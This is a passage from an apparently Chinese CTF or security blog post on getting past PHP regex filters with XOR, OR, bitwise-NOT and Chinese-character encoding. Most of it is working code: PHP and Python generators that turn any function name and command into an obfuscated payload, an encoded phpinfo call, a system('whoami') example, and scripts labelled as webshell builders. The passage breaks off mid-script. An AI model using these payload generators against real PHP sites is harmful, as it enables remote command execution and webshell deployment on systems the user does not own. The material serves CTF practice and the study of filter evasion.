punctuation">)</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>i<span class="token operator">^</span>j            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token operator">//</span>X处代表异或生成的字符                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' xor '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' == '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多字符绕过：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xor_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//生成一个 txt 文档 xor_rce.txt</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token comment">//讲十进制数变为十六进制</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[a-z0-9]/i'</span><span class="token punctuation">;</span>    <span class="token comment">// 根据题目给的正则表达式修改即可</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">//16进制数转为ASCII码</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>        <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>        <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment">//可见字符</span>            <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到运行结果如下：</p><p><img src="https://i.loli.net/2021/08/05/8HJXSFWmQY9t1UK.png"></p><h3 id="或运算绕过"><a href="#或运算绕过" class="headerlink" title="或运算绕过"></a><strong>或运算绕过</strong></h3><p>或运算其实和异或运算原理差不多，下面给出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>i<span class="token operator">^</span>j            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token operator">//</span>X处代表异或生成的字符                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' or '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' == '</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"or_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9a-z]/i'</span><span class="token punctuation">;</span>    <span class="token comment">// 根据题目给的正则表达式修改即可</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>        <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>        <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例题：</p><p><a href="http://121.5.40.245:9033/">**r2/interesting_char</a>**</p><h3 id="取反运算绕过"><a href="#取反运算绕过" class="headerlink" title="取反运算绕过"></a>取反运算绕过</h3><p>取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p><p>我们可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。假设我们要构造一个 <code>phpinfo();</code>，由于因为没有过滤括号，所以只需要先取反再编码字符串  “phpinfo” 就行了：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">(</span>~<span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/05/QNGVY7jRW5nCHhT.png"></p><p><code>phpinfo()</code> 是没有参数的，如果需要执行有参数的函数的话，比如 <code>system('whoami');</code>，则应分别对其中的字符进行编码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>取反脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//%8F%97%8F%96%91%99%90</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造webshell的脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//在命令行中运行</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">')(~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/05/EJ5I3GX4emgzUxM.png"></p><p><strong>汉字取反绕过</strong></p><p>利用的是 UTF-8 编码的某个汉字，将其中某个字符取出来，比如 <code>'和'{2}</code> 的结果是 <code>"\x8c"</code>，其再取反即可得到字母 <code>s</code>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'瞰'</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// a</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'和'</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'和'</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'的'</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// e</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'半'</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// r</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'始'</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// t</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同理构造webshell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// $__=2, 因为要获取'和'{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2。</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span>    <span class="token comment">// $_=1</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"的"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 